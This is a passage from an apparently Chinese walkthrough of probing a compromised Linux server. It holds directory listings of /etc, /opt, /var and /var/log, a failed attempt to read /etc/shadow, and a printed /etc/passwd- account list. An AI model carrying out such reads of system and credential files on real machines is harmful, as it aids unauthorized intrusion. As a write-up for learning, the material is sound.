0</span><br></pre></td></tr></table></figure><p>接下来查看<code>/etc/</code>底下的文件夹<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line">./  2016-08-09 18:16:11 12288   0755</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">rc4.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">pulse/  2016-07-12 00:01:49 4096    0755</span><br><span class="line">skel/   2016-07-11 23:50:01 4096    0755</span><br><span class="line">bash_completion.d/  2016-07-11 23:55:24 4096    0755</span><br><span class="line">samba/  2016-07-11 23:51:59 4096    0755</span><br><span class="line">pango/  2016-07-11 23:49:07 4096    0755</span><br><span class="line">cron.hourly/    2016-07-11 23:51:58 4096    0755</span><br><span class="line">foomatic/   2016-07-11 23:53:35 4096    0755</span><br><span class="line">rwtab.d/    2013-11-23 05:20:24 4096    0755</span><br><span class="line">chkconfig.d/    2013-09-23 17:07:36 4096    0755</span><br><span class="line">obex-data-server/   2016-07-11 23:49:42 4096    0755</span><br><span class="line">wpa_supplicant/ 2016-07-11 23:48:32 4096    0755</span><br><span class="line">vmware-tools/   2016-07-12 00:03:14 4096    0755</span><br><span class="line">logrotate.d/    2016-07-16 02:41:56 4096    0755</span><br><span class="line">gnome-vfs-2.0/  2016-07-11 23:48:27 4096    0755</span><br><span class="line">terminfo/   2010-08-18 23:41:41 4096    0755</span><br><span class="line">xdg/    2016-07-11 23:50:13 4096    0755</span><br><span class="line">alternatives/   2016-07-11 23:52:04 4096    0755</span><br><span class="line">hal/    2016-07-11 23:50:59 4096    0755</span><br><span class="line">setuptool.d/    2016-07-11 23:51:14 4096    0755</span><br><span class="line">init.d/ 2016-08-01 11:01:39 4096    0755</span><br><span class="line">cups/   2016-07-11 23:54:38 4096    0755</span><br><span class="line">makedev.d/  2016-07-11 23:47:34 4096    0755</span><br><span class="line">ntp/    2016-07-11 23:51:44 4096    0755</span><br><span class="line">abrt/   2016-07-11 23:48:54 4096    0755</span><br><span class="line">pm/ 2016-07-11 23:46:08 4096    0755</span><br><span class="line">rc.d/   2016-07-12 00:03:18 4096    0755</span><br><span class="line">httpd/  2016-07-16 02:12:59 4096    0755</span><br><span class="line">gdm/    2016-07-11 23:51:13 4096    0755</span><br><span class="line">gtk-2.0/    2016-07-11 :50:01   4096    0755</span><br><span class="line">ssl/    2016-07-11 23:47:27 4096    0755</span><br><span class="line">libreport/  2016-07-11 23:48:53 4096    0755</span><br><span class="line">gcrypt/ 2013-10-24 23:38:14 4096    0755</span><br><span class="line">sound/  2016-07-11 23:50:01 4096    0755</span><br><span class="line">rc1.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">yum.repos.d/    2016-07-11 23:50:16 4096    0755</span><br><span class="line">default/    2016-07-11 23:46:45 4096    0755</span><br><span class="line">dracut.conf.d/  2016-07-12 00:01:52 4096    0755</span><br><span class="line">rpm/    2016-07-16 02:33:57 4096    0755</span><br><span class="line">php.d/  2016-07-16 02:33:56 4096    0755</span><br><span class="line">avahi/  2016-07-11 23:48:23 4096    0755</span><br><span class="line">openldap/   2016-07-11 23:58:43 4096    0755</span><br><span class="line">sudoers.d/  2013-11-22 20:51:12 4096    0750</span><br><span class="line">festival/   2016-07-11 23:50:10 4096    0755</span><br><span class="line">kdump-adv-conf/ 2016-07-11 23:54:24 4096    0755</span><br><span class="line">rsyslog.d/  2013-11-22 23:15:59 4096    0755</span><br><span class="line">depmod.d/   2016-07-11 23:48:04 4096    0755</span><br><span class="line">PackageKit/ 2016-07-11 23:50:14 4096    0755</span><br><span class="line">snmp/   2016-08-01 11:03:14 4096    0755</span><br><span class="line">profile.d/  2016-07-11 23:54:40 4096    0755</span><br><span class="line">dnsmasq.d/  2013-02-22 12:40:04 4096    0755</span><br><span class="line">pam.d/  2016-07-12 00:00:58 4096    0755</span><br><span class="line">rc6.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">sgml/   2016-07-11 23:48:11 4096    0755</span><br><span class="line">plymouth/   2016-07-11 23:50:30 4096    0755</span><br><span class="line">cron.weekly/    2011-09-27 09:33:08 4096    0755</span><br><span class="line">sane.d/ 2016-07-11 23:51:40 4096    0755</span><br><span class="line">pear/   2016-05-11 06:42:17 4096    0755</span><br><span class="line">ppp/    2016-07-11 23:50:19 4096    0755</span><br><span class="line">event.d/    2016-07-11 23:48:06 4096    0755</span><br><span class="line">popt.d/ 2010-08-21 13:30:56 4096    0755</span><br><span class="line">pcmcia/ 2016-07-11 23:52:27 4096    0755</span><br><span class="line">rc0.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">sysconfig/  2016-08-01 11:01:39 4096    0755</span><br><span class="line">lvm/    2016-07-11 23:54:01 4096    0755</span><br><span class="line">bonobo-activation/  2016-07-11 23:47:18 4096    0755</span><br><span class="line">audisp/ 2016-07-113:54:43   4096    0750</span><br><span class="line">opt/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">polkit-1/   2016-07-11 23:48:05 4096    0755</span><br><span class="line">prelink.conf.d/ 2016-07-12 00:00:53 4096    0755</span><br><span class="line">gnupg/  2013-10-24 23:38:54 4096    0755</span><br><span class="line">ghostscript/    2016-07-11 23:49:01 4096    0755</span><br><span class="line">ld.so.conf.d/   2016-07-16 01:49:50 4096    0755</span><br><span class="line">rc2.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">iproute2/   2016-07-11 23:50:18 4096    0755</span><br><span class="line">udev/   2016-07-11 23:50:21 4096    0755</span><br><span class="line">init/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">cron.daily/ 2016-07-11 23:55:23 4096    0755</span><br><span class="line">acpi/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">rc3.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">postfix/    2016-07-11 23:51:54 4096    0755</span><br><span class="line">X11/    2016-07-11 23:51:00 4096    0755</span><br><span class="line">ssh/    2016-07-12 00:00:35 4096    0755</span><br><span class="line">cron.monthly/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">blkid/  2013-11-22 23:29:33 4096    0755</span><br><span class="line">security/   2016-07-11 23:51:58 4096    0755</span><br><span class="line">scl/    2016-07-11 23:55:24 4096    0755</span><br><span class="line">alsa/   2016-07-11 23:52:26 4096    0755</span><br><span class="line">gconf/  2016-07-11 23:48:20 4096    0755</span><br><span class="line">statetab.d/ 2013-11-23 05:20:24 4096    0755</span><br><span class="line">pkcs11/ 2016-07-11 23:47:16 4096    0755</span><br><span class="line">dbus-1/ 2016-07-11 23:47:00 4096    0755</span><br><span class="line">sasl2/  2016-07-11 23:51:54 4096    0755</span><br><span class="line">hp/ 2016-07-11 23:51:40 4096    0755</span><br><span class="line">pki/    2016-07-11 23:51:43 4096    0755</span><br><span class="line">fonts/  2016-07-11 23:47:58 4096    0755</span><br><span class="line">ConsoleKit/ 2016-07-11 23:48:06 4096    0755</span><br><span class="line">xml/    2016-07-11 23:46:06 4096    0755</span><br><span class="line">dhcp/   2013-11-22 22:30:00 4096    0750</span><br><span class="line">rc5.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">xinetd.d/   2016-07-11 23:55:23 4096    0755</span><br><span class="line">vmware-caf/ 2016-07-12 00:00:57 4096    0755</span><br><span class="line">yum/    2016-07-11 23:48:52 4096    0755</span><br><span class="line">hosts.deny  2010-01-12 21:28:22 460 0644</span><br><span class="line">statetab    20131-23 05:20:24   212 0644</span><br><span class="line">networks    2013-11-23 05:20:24 58  0644</span><br><span class="line">motd    2010-01-12 21:28:22 0   0644</span><br><span class="line">ntp.conf    2013-07-15 17:18:47 1778    0644</span><br><span class="line">at.deny 2012-01-30 21:56:34 1   0644</span><br><span class="line">inputrc 2010-01-12 21:28:22 942 0644</span><br><span class="line">pm-utils-hd-apm-restore.conf    2012-07-18 17:04:08 370 0644</span><br><span class="line">.pwd.lock   1970-01-01 08:00:00     0</span><br><span class="line">libuser.conf    2016-07-11 23:58:43 2290    0644</span><br><span class="line">sudo-ldap.conf  2013-10-07 20:51:58 3181    0640</span><br><span class="line">mailcap 2009-11-18 05:13:33 272 0644</span><br><span class="line">bluetooth   1970-01-01 08:00:00     0</span><br><span class="line">selinux 1970-01-01 08:00:00     0</span><br><span class="line">mime.types  2011-09-23 23:02:51 43591   0644</span><br><span class="line">rc.sysinit  1970-01-01 08:00:00     0</span><br><span class="line">hosts.allow 2010-01-12 21:28:22 370 0644</span><br><span class="line">magic   2012-10-04 22:51:04 111 0644</span><br><span class="line">my.cnf  2016-05-11 14:31:18 251 0644</span><br><span class="line">sysctl.conf 2013-11-23 05:20:24 1150    0644</span><br><span class="line">crypttab    2016-07-11 23:45:38 0   0644</span><br><span class="line">nanorc  2010-11-12 15:18:32 7846    0644</span><br><span class="line">man.config  2013-02-22 10:13:09 4940    0644</span><br><span class="line">csh.cshrc   2013-10-02 17:06:18 1602    0644</span><br><span class="line">yum.conf    2013-02-22 19:26:34 969 0644</span><br><span class="line">securetty   2010-01-12 21:28:22 122 0600</span><br><span class="line">bashrc  2013-10-02 17:06:18 2681    0644</span><br><span class="line">group   2016-07-16 02:31:22 774 0644</span><br><span class="line">libaudit.conf   2012-03-02 02:42:34 191 0640</span><br><span class="line">pbm2ppa.conf    2010-08-23 07:28:29 1362    0644</span><br><span class="line">gshadow 1970-01-01 08:00:00     0</span><br><span class="line">protocols   2010-01-12 21:28:22 6455    0644</span><br><span class="line">dnsmasq.conf    2013-02-22 12:40:04 21214   0644</span><br><span class="line">hosts   2010-01-12 21:28:22 158 0644</span><br><span class="line">shadow  1970-01-01 08:00:00     0</span><br><span class="line">passwd- 2016-07-11 23:59:08 1435    0644</span><br><span class="line">vimrc   2012-02-17 23:17:03 1962    0644</span><br><span class="line">quotatab    2013-11-22 19:32:14 259 0644</span><br><span class="line">environment 2013-10-02 17:06:18 0   0644</span><br><span class="line">portreserve 10-01-01 08:00:00       0</span><br><span class="line">anacrontab  2013-11-23 20:43:13 541 0600</span><br><span class="line">issue.net   2013-11-27 19:53:33 46  0644</span><br><span class="line">centos-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">aliases 1970-01-01 08:00:00     0</span><br><span class="line">mtab    2016-07-16 01:08:53 444 0644</span><br><span class="line">quotagrpadmins  2008-10-14 01:29:19 220 0644</span><br><span class="line">sudo.conf   2012-09-25 23:46:01 1786    0640</span><br><span class="line">favicon.png 2007-01-25 05:13:36 918 0644</span><br><span class="line">exports 2010-01-12 21:28:22 0   0644</span><br><span class="line">sestatus.conf   2013-11-23 06:44:51 216 0644</span><br><span class="line">printcap    2010-01-12 21:28:22 233 0644</span><br><span class="line">rsyslog.conf    1970-01-01 08:00:00     0</span><br><span class="line">gshadow-    1970-01-01 08:00:00     0</span><br><span class="line">DIR_COLORS.256color 2013-10-17 20:51:45 5139    0644</span><br><span class="line">ld.so.conf  2013-07-25 02:50:25 28  0644</span><br><span class="line">DIR_COLORS  2013-10-17 20:51:45 4439    0644</span><br><span class="line">rc.local    2016-07-11 23:59:08 220 0755</span><br><span class="line">system-release-cpe  2013-11-27 19:53:33 25  0644</span><br><span class="line">grub.conf   1970-01-01 08:00:00     0</span><br><span class="line">localtime   2016-07-11 23:58:41 2819    0644</span><br><span class="line">virc    2012-02-17 23:17:03 1962    0644</span><br><span class="line">prelink.conf    2013-07-19 22:35:49 789 0644</span><br><span class="line">services    2013-10-02 17:06:18 641020  0644</span><br><span class="line">kdump.conf  2016-07-11 23:54:24 7786    0644</span><br><span class="line">tpvmlp.conf 2016-07-16 01:01:27 1309    0644</span><br><span class="line">host.conf   2013-10-02 17:06:18 9   0644</span><br><span class="line">ethers  2012-05-10 16:17:31 28  0644</span><br><span class="line">issue   2013-11-27 19:53:33 47  0644</span><br><span class="line">pinforc 2010-08-21 09:43:26 2872    0644</span><br><span class="line">drirc   2013-11-25 20:52:10 1804    0644</span><br><span class="line">pnm2ppa.conf    2010-08-23 07:28:29 6300    0644</span><br><span class="line">redhat-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">dracut.conf 2013-11-26 18:58:48 519 0644</span><br><span class="line">updatedb.conf   1970-01-01 08:00:00     0</span><br><span class="line">inittab 2016-07-12 00:03:18 884 0644</span><br><span class="line">sudoers 2012-03-02 01:18:24 4002    0440</span><br><span class="line">odbc.ini    2014-07-10 16::09   0   0644</span><br><span class="line">adjtime 1970-01-01 08:00:00     0</span><br><span class="line">csh.login   2013-10-02 17:06:18 794 0644</span><br><span class="line">group-  2016-07-11 23:59:08 762 0600</span><br><span class="line">pear.conf   2016-05-11 06:42:17 946 0644</span><br><span class="line">wgetrc  2012-10-10 17:06:54 4479    0644</span><br><span class="line">shadow- 1970-01-01 08:00:00     0</span><br><span class="line">fstab   2016-07-12 00:03:17 805 0644</span><br><span class="line">audit   1970-01-01 08:00:00     0</span><br><span class="line">nsswitch.conf   2010-05-05 03:22:21 1688    0644</span><br><span class="line">NetworkManager  1970-01-01 08:00:00     0</span><br><span class="line">warnquota.conf  2013-11-22 19:32:22 3008    0644</span><br><span class="line">login.defs  2016-07-11 23:58:43 1831    0644</span><br><span class="line">mke2fs.conf 2009-09-08 05:02:53 801 0644</span><br><span class="line">DIR_COLORS.lightbgcolor 2013-10-17 20:51:45 4113    0644</span><br><span class="line">prelink.cache   1970-01-01 08:00:00     0</span><br><span class="line">passwd.OLD  2016-07-11 23:59:08 1429    0644</span><br><span class="line">mtools.conf 2010-08-17 05:28:51 2620    0644</span><br><span class="line">readahead.conf  2013-11-23 21:52:17 966 0644</span><br><span class="line">fprintd.conf    2013-11-22 22:35:33 20  0644</span><br><span class="line">rwtab   2013-11-23 05:20:24 930 0644</span><br><span class="line">mail.rc 2013-08-01 17:12:47 1909    0644</span><br><span class="line">shadow.bak  2016-07-28 17:40:52 844 0755</span><br><span class="line">smartd.conf 2013-02-22 06:26:22 6717    0644</span><br><span class="line">odbcinst.ini    2014-07-10 16:15:09 575 0644</span><br><span class="line">gai.conf    2013-11-22 05:24:28 0   0644</span><br><span class="line">php.ini 2016-05-11 05:42:18 69097   0644</span><br><span class="line">crontab 1970-01-01 08:00:00     0</span><br><span class="line">ld.so.cache 2016-08-01 11:01:41 53651   0644</span><br><span class="line">system-release  2013-11-27 19:53:33 27  0644</span><br><span class="line">aliases.db  1970-01-01 08:00:00     0</span><br><span class="line">passwd  2016-07-16 02:31:22 1487    0644</span><br><span class="line">top.ini 2016-08-10 14:15:01 0   0644</span><br><span class="line">modprobe.d  1970-01-01 08:00:00     0</span><br><span class="line">enscript.cfg    2010-11-11 14:44:35 4843    0644</span><br><span class="line">rpc 2010-05-04 19:27:23 1615    0644</span><br><span class="line">cron.deny   2013-11-23 20:43:13 0   0600</span><br><span class="line">cron.d  1970-01-01 08:00:00     0</span><br><span class="line">shells  2016-07-113:54:44   61  0644</span><br><span class="line">profile 2013-10-02 17:06:18 1796    0644</span><br><span class="line">asound.conf 2009-05-15 04:53:38 148 0644</span><br><span class="line">logrotate.conf  2007-08-29 15:19:36 662 0644</span><br><span class="line">filesystems 2013-10-02 17:06:18 64  0644</span><br><span class="line">krb5.conf   2013-08-29 01:33:13 449 0644</span><br><span class="line">sos.conf    2013-11-23 03:12:07 260 0644</span><br><span class="line">rc  1970-01-01 08:00:00     0</span><br><span class="line">resolv.conf 2016-07-25 11:57:19 49  0644</span><br></pre></td></tr></table></figure><p></p><p>接下来查看<code>/etc/shadow</code>这个文件，但是没看到，估计是因为权限不够<br>接下来查看<code>/etc/passwd-</code><br>获得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">|root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin</span><br><span class="line">vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin</span><br><span class="line">rtkit:x:499:497:RealtimeKit:/proc:/sbin/nologin</span><br><span class="line">avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin</span><br><span class="line">abrt:x:173:173::/etc/abrt:/sbin/nologin</span><br><span class="line">haldaemon:x:68:68:HAL daemon:/:/sbin/nologin</span><br><span class="line">gdm:x:42:42::/var/lib/gdm:/sbin/nologin</span><br><span class="line">ntp:x:38:38::/etc/ntp:/sbin/nologin</span><br><span class="line">apache:x:48:48:Apache:/var/www:/sbin/nologin</span><br><span class="line">saslauth:x:498:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">pulse:x:497:496:PulseAudio Syst Daemon:/var/run/pulse:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">tcpdump:x:72:72::/:/sbin/nologin</span><br><span class="line">simple:x:500:500:Simple:/home/simple:/bin/bash</span><br></pre></td></tr></table></figure><p>接下来<code>/home</code>里面<br>没看到东西。<br>接下来查看<code>/opt/</code>底下<br>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">./  2016-07-12 00:03:18 4096    0755</span><br><span class="line">rh/ 2013-11-22 18:16:37 4096    0755</span><br></pre></td></tr></table></figure><p>接下来又傻逼的查看<code>/home</code>里面<br>没看到东西。<br>接下来查看<code>/var/</code>里面<br>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">db/ 2016-07-11 23:54:42 4096    0755</span><br><span class="line">lib/    2016-07-16 02:31:24 4096    0755</span><br><span class="line">lock/   2016-08-09 18:16:02 4096    0775</span><br><span class="line">tmp/    2016-08-08 09:46:00 4096    1777</span><br><span class="line">spool/  2016-07-11 23:54:43 4096    0755</span><br><span class="line">run/    2016-08-10 00:35:03 4096    0755</span><br><span class="line">cache/  2016-07-16 02:33:57 4096    0755</span><br><span class="line">crash/  2013-11-23 09:15:37 4096    0755</span><br><span class="line">gdm/    2013-11-22 23:54:18 4096    1770</span><br><span class="line">preserve/   2011-09-23 19:50:20 4096    0755</span><br><span class="line">account/    2016-07-11 23:54:44 4096    0755</span><br><span class="line">www/    2016-08-04 10:37:16 4096    0755</span><br><span class="line">empty/  2016-07-11 23:54:25 4096    0755</span><br><span class="line">log/    2016-08-07 18:36:03 4096    0755</span><br><span class="line">nis/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">local/  2011-09-23 19:50:20 4096    0755</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">opt/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">./  2016-07-22 19:50:16 4096    0755</span><br><span class="line">yp  1970-01-01 08:00:00     0</span><br><span class="line">abc 1970-01-01 08:00:00     0</span><br><span class="line">games   1970-01-01 08:00:00     0</span><br><span class="line">mail    1970-01-01 08:00:00     0</span><br></pre></td></tr></table></figure><p>接下来查看<code>/var/log/</code><br>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">ntpstats/   2013-11-24 02:21:54 4096    0755</span><br><span class="line">samba/  2016-07-11 23:52:01 4096    0700</span><br><span class="line">cups/   2013-08-17 18:21:22 4096    0755</span><br><span class="line">httpd/  2016-08-07 18:36:02 4096    0700</span><br><span class="line">gdm/    2016-07-16 01:01:33 4096    1770</span><br><span class="line">sa/ 2016-08-09 15:00:01 4096    0755</span><br><span class="line">../ 2016-07-22 19:50:16 4096    0755</span><br><span class="line">ppp/    2010-08-23 07:22:22 4096    0700</span><br><span class="line">./  2016-08-07 18:36:03 4096    0755</span><br><span class="line">prelink/    2016-07-16 02:16:57 4096    0755</span><br><span class="line">ConsoleKit/ 2016-07-12 00:03:21 4096    0755</span><br><span class="line">vmware-caf/ 2016-07-12 00:01:49 4096    0755</span><br><span class="line">secure  2016-08-10 14:10:25 997 0600</span><br><span class="line">maillog-20160724    2016-07-22 19:34:03 3589    0600</span><br><span class="line">yum.log 2016-08-01 14:59:17 1907    0600</span><br><span class="line">anaconda.program.log    2016-07-11 23:59:08 31242   0600</span><br><span class="line">pm-powersave.log    2016-07-16 01:01:34 89  0644</span><br><span class="line">cron    2016-08-10 14:18:01 360975  0600</span><br><span class="line">cron-20160724   2016-07-25 12:43:01 101645  0600</span><br><span class="line">wtmp    2016-08-10 14:10:25 51072   0664</span><br><span class="line">messages-20160724   2016-07-25 11:57:19 21952   0600</span><br><span class="line">Xorg.0.log.old  2016-07-12 00:15:52 50682   0644</span><br><span class="line">wpa_supplicant.log  2016-07-12 00:00:29 0   0644</span><br><span class="line">anaconda.syslog 2016-07-11 23:59:08 148754  0600</span><br><span class="line">anaconda.ifcfg.log  2016-07-11 23:59:08 2657    0600</span><br><span class="line">anaconda.storage.log    2016-07-11 23:59:08 109194  0600</span><br><span class="line">Xorg.1.log  2016-07-12 00:14:50 50448   0644</span><br><span 